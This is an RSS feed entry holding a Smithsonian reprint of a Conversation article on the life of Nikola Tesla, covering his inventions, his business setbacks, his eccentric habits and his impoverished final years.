<guid isPermaLink="true" >https://www.smithsonianmag.com/innovation/extraordinary-life-nikola-tesla-180967758/?no-ist</guid>
<description>&lt;p&gt;Match the following figures – Albert Einstein, Thomas Edison, Guglielmo Marconi, Alfred Nobel and Nikola Tesla – with these biographical facts:&lt;/p&gt;

&lt;br/&gt;&lt;ul&gt;&lt;li&gt;Spoke eight languages&lt;/li&gt;
&lt;li&gt;Produced the first motor that ran on AC current&lt;/li&gt;
&lt;li&gt;Developed the underlying technology for wireless communication over long distances&lt;/li&gt;
&lt;li&gt;Held approximately 300 patents&lt;/li&gt;
&lt;li&gt;Claimed to have developed a “superweapon” that would end all war&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The match for each, of course, is Tesla. Surprised? Most people have heard his name, but few know much about &lt;a href=&quot;http://www.teslasociety.com/biography.htm?xid=PS_smithsonian&quot;&gt;his place in modern science and technology&lt;/a&gt;.&lt;/p&gt;


&lt;p&gt;The 75th anniversary of Tesla’s death on Jan. 7 provides a timely opportunity to review the life of a man who came from nowhere yet became world famous; claimed to be devoted solely to discovery but relished the role of a showman; attracted the attention of many women but never married; and generated ideas that transformed daily life and created multiple fortunes but died nearly penniless.&lt;/p&gt;
&lt;h2&gt;Early years&lt;/h2&gt;
&lt;p&gt;Tesla was born in Serbia on a summer night in 1856, during what he claimed was &lt;a href=&quot;https://books.google.com/books?id=kFFWipanqsoC&amp;amp;q=storm#v=snippet&amp;amp;q=storm&amp;amp;f=false?xid=PS_smithsonian&quot;&gt;a lightning storm&lt;/a&gt; – which led the midwife to say, “He will be a child of the storm,” and his mother to counter prophetically, “No, of the light.” As a student, Tesla displayed such remarkable abilities to calculate mathematical problems that teachers accused him of cheating. During his teen years, he fell seriously ill, recovering once his father abandoned his demand that Nikola become a priest and agreed he could attend engineering school instead.&lt;/p&gt;
&lt;img class=&quot; lazy&quot; alt=&quot;Nikola Tesla, electrical entrepreneur, circa 1893&quot; src=&quot;https://public-media.smithsonianmag.com/filer/58/20/5820175a-acdf-4bf0-bf4b-2ddd425d9107/file-20180102-26163-d9wlms.jpg&quot;/&gt; Nikola Tesla, electrical entrepreneur, circa 1893 &lt;span class=&quot;credits&quot;&gt;(Napoleon Sarony)&lt;/span&gt;

&lt;p&gt;Although an outstanding student, Tesla eventually withdrew from polytechnic school and ended up working for the &lt;a href=&quot;https://teslaresearch.jimdo.com/edison-s-continental-1882-1885/?xid=PS_smithsonian&quot;&gt;Continental Edison Company&lt;/a&gt;, where he focused on electrical lighting and motors. Wishing to meet Edison himself, Tesla immigrated to the U.S. in 1884, and he later claimed he was offered the sum of US$50,000 if he could solve a series of engineering problems Edison’s company faced. Having achieved the feat, Tesla said he was then told that the offer had just been a joke, and he left the company after six months.&lt;/p&gt;
&lt;p&gt;Tesla then developed a relationship with two businessmen that led to the founding of &lt;a href=&quot;https://teslaresearch.jimdo.com/tesla-electric-light-manufacturing-1884-1886/articles-on-the-tesla-electric-light-manufacturing/?xid=PS_smithsonian&quot;&gt;Tesla Electric Light and Manufacturing&lt;/a&gt;. He filed a number of electrical patents, which he assigned to the company. When his partners decided that they wanted to focus strictly on supplying electricity, they took the company’s intellectual property and founded another firm, leaving Tesla with nothing.&lt;/p&gt;
&lt;p&gt;Tesla reported that he then &lt;a href=&quot;http://www.teslasautobiography.com/?xid=PS_smithsonian&quot;&gt;worked as a ditch digger&lt;/a&gt; for $2 a day, tortured by the sense that his great talent and education were going to waste.&lt;/p&gt;
&lt;h2&gt;Success as an inventor&lt;/h2&gt;
&lt;p&gt;In 1887, Tesla met two investors who agreed to back the formation of the Tesla Electric Company. He set up a laboratory in Manhattan, where he developed the &lt;a href=&quot;http://www.teslasociety.com/hall_of_fame.htm?xid=PS_smithsonian&quot;&gt;alternating current induction motor&lt;/a&gt;, which solved a number of technical problems that had bedeviled other designs. When Tesla demonstrated his device at an engineering meeting, the Westinghouse Company made arrangements to license the technology, providing an upfront payment and royalties on each horsepower generated.&lt;/p&gt;
&lt;p&gt;The so-called “&lt;a href=&quot;https://energy.gov/articles/war-currents-ac-vs-dc-power?xid=PS_smithsonian&quot;&gt;War of the Currents&lt;/a&gt;” was raging in the late 1880s. Thomas Edison promoted direct current, asserting that it was safer than AC. George Westinghouse backed AC, since it could transmit power over long distances. Because the two were undercutting each other’s prices, Westinghouse lacked capital. He explained the difficulty and asked Tesla to sell his patents to him for a single lump sum, to which Tesla agreed, forgoing what would have been a vast fortune had he held on to them.&lt;/p&gt;
&lt;img class=&quot; lazy&quot; alt=&quot;AC electric lights lit up the night at the Chicago World’s Fair&quot; src=&quot;https://public-media.smithsonianmag.com/filer/ba/b7/bab7d366-78d8-4fcb-bb78-8f8a946cac2c/file-20180102-26139-cx22cw.jpg&quot;/&gt; AC electric lights lit up the night at the Chicago World’s Fair &lt;span class=&quot;credits&quot;&gt;(The Conversation)&lt;/span&gt;
&lt;p&gt;With the &lt;a href=&quot;http://www.encyclopedia.chicagohistory.org/pages/1386.html?xid=PS_smithsonian&quot;&gt;World’s Columbian Exposition&lt;/a&gt; of 1893 looming in Chicago, Westinghouse asked Tesla to help supply power; they’d have a huge platform for demonstrating the merits of AC. Tesla helped the fair illuminate more light bulbs than could be found in the entire city of Chicago, and wowed audiences with a variety of wonders, including an electric light that required no wires. Later Tesla also helped Westinghouse win a contract to generate electrical power at &lt;a href=&quot;http://www.teslasociety.com/niagarafalls.htm?xid=PS_smithsonian&quot;&gt;Niagara Falls&lt;/a&gt;, helping to build the first large-scale AC power plant in the world.&lt;/p&gt;
&lt;h2&gt;Challenges along the way&lt;/h2&gt;
&lt;p&gt;Tesla encountered many obstacles. In 1895, his Manhattan laboratory was devastated by a fire, which destroyed his notes and prototypes. At Madison Square Garden in 1898, he demonstrated &lt;a href=&quot;http://www.pbs.org/tesla/ins/lab_remotec.html?xid=PS_smithsonian&quot;&gt;wireless control&lt;/a&gt; of a boat, a stunt that many branded a hoax. Soon after he turned his attention to the wireless transmission of electric power. He believed that his system could not only distribute electricity around the globe but also provide for worldwide wireless communication.&lt;/p&gt;
&lt;p&gt;Seeking to test his ideas, Tesla built a laboratory in &lt;a href=&quot;https://teslaresearch.jimdo.com/colorado-springs-lab-1899-1900/?xid=PS_smithsonian&quot;&gt;Colorado Springs&lt;/a&gt;. There he once drew so much power that he caused a regional power outage. He also detected signals that he claimed emanated from an extraterrestrial source. In 1901 Tesla persuaded J.P. Morgan to invest in the construction of a &lt;a href=&quot;https://teslaresearch.jimdo.com/wardenclyffe-lab-1901-1906/?xid=PS_smithsonian&quot;&gt;tower on Long Island&lt;/a&gt; that he believed would vindicate his plan to electrify the world. Yet Tesla’s dream did not materialize, and Morgan soon withdrew funding.&lt;/p&gt;
&lt;p&gt;In 1909, &lt;a href=&quot;https://www.nobelprize.org/nobel_prizes/physics/laureates/1909/marconi-bio.html?xid=PS_smithsonian&quot;&gt;Marconi received the Nobel Prize&lt;/a&gt; for the development of radio. In 1915, Tesla unsuccessfully sued Marconi, claiming infringement on his patents. That same year, &lt;a href=&quot;http://teslacollection.com/tesla_articles/1915/new_york_times/m_u/edison_and_tesla_to_get_nobel_prizes?xid=PS_smithsonian&quot;&gt;it was rumored&lt;/a&gt; that Edison and Tesla would share the Nobel Prize, but it didn’t happen. Unsubstantiated speculation suggested their mutual animosity was the cause. However, Tesla did receive numerous honors and awards over his life, including, ironically, the American Institute of Electrical Engineers &lt;a href=&quot;https://teslauniverse.com/nikola-tesla/articles/nikola-tesla-awarded-edison-medal-aiee?xid=PS_smithsonian&quot;&gt;Edison Medal&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;A singular man&lt;/h2&gt;
&lt;p&gt;Tesla was a &lt;a href=&quot;http://www.teslasautobiography.com/?xid=PS_smithsonian&quot;&gt;remarkable person&lt;/a&gt;. He said that he had a photographic memory, which helped him memorize whole books and speak eight languages. He also claimed that many of his best ideas came to him in a flash, and that he saw detailed pictures of many of his inventions in his mind before he ever set about constructing prototypes. As a result, he didn’t initially prepare drawings and plans for many of his devices.&lt;/p&gt;
&lt;p&gt;The 6-foot-2-inch Tesla cut a dashing figure and was popular with women, though he never married, claiming that his &lt;a href=&quot;https://books.google.com/books?id=DzMR8x_rbPgC&amp;amp;pg=PT235&amp;amp;lpg=PT235&amp;amp;dq=tesla+chastity&amp;amp;source=bl&amp;amp;ots=hD8vJwA2DJ&amp;amp;sig=Yo5HDsgYCmYrGaUOlEdqysRLm54&amp;amp;hl=en&amp;amp;sa=X&amp;amp;ved=0ahUKEwi_-a_4hrfYAhWB0YMKHZM2DGIQ6AEIPTAE#v=onepage&amp;amp;q=tesla%20chastity&amp;amp;f=false?xid=PS_smithsonian&quot;&gt;celibacy played an important role in his creativity&lt;/a&gt;. Perhaps because of his nearly fatal illness as a teenager, he feared germs and practiced very strict hygiene, likely a barrier to the development of interpersonal relationships. He also exhibited unusual phobias, such as an aversion to pearls, which led him to refuse to speak to any woman wearing them.&lt;/p&gt;
&lt;img class=&quot; lazy&quot; alt=&quot;Mark Twain holding Tesla’s experimental vacuum lamp, 1894.&quot; src=&quot;https://public-media.smithsonianmag.com/filer/b7/a0/b7a08485-3d4e-47fa-ac32-52a212ddb633/file-20180102-26142-cqrkk2.jpg&quot;/&gt; Mark Twain holding Tesla’s experimental vacuum lamp, 1894 &lt;span class=&quot;credits&quot;&gt;(The Conversation)&lt;/span&gt;
&lt;p&gt;Tesla held that his greatest ideas came to him in solitude. Yet he was no hermit, socializing with many of the most &lt;a href=&quot;http://www.teslasociety.com/famousfriends.htm?xid=PS_smithsonian&quot;&gt;famous people of his day&lt;/a&gt; at elegant dinner parties he hosted. Mark Twain frequented his laboratory and promoted some of his inventions. Tesla enjoyed a reputation as not only a great engineer and inventor but also a philosopher, poet and connoisseur. On his 75th birthday he received a congratulatory letter from Einstein and was featured on the cover of Time magazine.&lt;/p&gt;
&lt;h2&gt;Tesla’s last years&lt;/h2&gt;
&lt;img class=&quot; lazy&quot; alt=&quot;A renaissance man of sorts, on the occasion of his 75th birthday.&quot; src=&quot;https://public-media.smithsonianmag.com/filer/4a/ad/4aad58d0-fe5a-4b5b-8008-c23bf37cbe18/file-20180102-26145-1fn6hdj.jpg&quot;/&gt; A renaissance man of sorts, on the occasion of his 75th birthday. &lt;span class=&quot;credits&quot;&gt;(Time)&lt;/span&gt;
&lt;div readability=&quot;35.472936400541&quot;&gt;
&lt;p&gt;In the popular imagination, Tesla played the part of a &lt;a href=&quot;https://www.realclearscience.com/blog/2012/10/mad-scientists-of-the-modern-era-nikola-tesla.html?xid=PS_smithsonian&quot;&gt;mad scientist&lt;/a&gt;. He claimed that he had developed a motor that ran on cosmic rays; that he was working on a new non-Einsteinian physics that would supply a new form of energy; that he had discovered a new technique for photographing thoughts; and that he had developed a new ray, alternately labeled the death ray and the peace ray, with vastly greater military potential than Nobel’s munitions.&lt;/p&gt;
&lt;p&gt;His money long gone, Tesla spent his later years moving from place to place, leaving behind unpaid bills. Eventually, he settled in at a New York hotel, where his rent was paid by Westinghouse. Always living alone, he frequented the local park, where he was regularly seen &lt;a href=&quot;http://www.nytimes.com/2010/02/07/automobiles/07NIKOLA.html?xid=PS_smithsonian&quot;&gt;feeding and tending to the pigeons&lt;/a&gt;, with which he claimed to share a special affinity. On the morning of Jan. 7, 1943, he was found dead in his room by a hotel maid at age 86.&lt;/p&gt;
&lt;p&gt;Today &lt;a href=&quot;http://www.nytimes.com/2010/02/07/automobiles/07NIKOLA.html?xid=PS_smithsonian&quot;&gt;the name Tesla&lt;/a&gt; is still very much in circulation. The airport in Belgrade bears his name, as does the world’s best-known electric car, and the magnetic field strength of MRI scanners is measured in Teslas. Tesla was a real-life Prometheus: the mythical Greek titan who raided heaven to bring fire to mankind, yet in punishment was chained to a rock where each day an eagle ate his liver. Tesla scaled great heights to bring lightning down to earth, yet his rare cast of mind and uncommon habits eventually led to his downfall, leaving him nearly penniless and alone.&lt;/p&gt;
&lt;/div&gt;

&lt;br/&gt;&lt;em&gt;This article was originally published on &lt;a href=&quot;https://theconversation.com/nikola-tesla-the-extraordinary-life-of-a-modern-prometheus-89479?xid=PS_smithsonian&quot;&gt;The Conversation.&lt;/a&gt;&lt;/em&gt; &lt;img src=&quot;https://counter.theconversation.com/content/89479/count.gif&quot; alt=&quot;The Conversation&quot; width=&quot;1&quot; height=&quot;1&quot;/&gt;&lt;p&gt;&lt;em&gt;Richard Gunderman, Chancellor's Professor of Medicine, Liberal Arts, and Philanthropy, Indiana University&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 06 Jan 2018 01:16:44 +0000</pubDate>
<dc:creator>Hooke</dc:creator>
<og:image>https://thumbs-prod.si-cdn.com/Bs6xELTXiaKJ9CnNDjBfR8nCoj4=/1072x720/filters:no_upscale()/https://public-media.smithsonianmag.com/filer/d9/c5/d9c55db6-8b22-4e72-9c69-056f77263100/file-20180102-26163-8mp710.jpg</og:image>
<og:title>The Extraordinary Life of Nikola Tesla</og:title>
<og:url>https://www.smithsonianmag.com/innovation/extraordinary-life-nikola-tesla-180967758/</og:url>
<og:type>article</og:type>
<og:description>The eccentric inventor and modern Prometheus died 75 years ago, after a rags-to-riches to rags life</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.smithsonianmag.com/innovation/extraordinary-life-nikola-tesla-180967758/?no-ist</dc:identifier>
</item>
</channel>
</rss>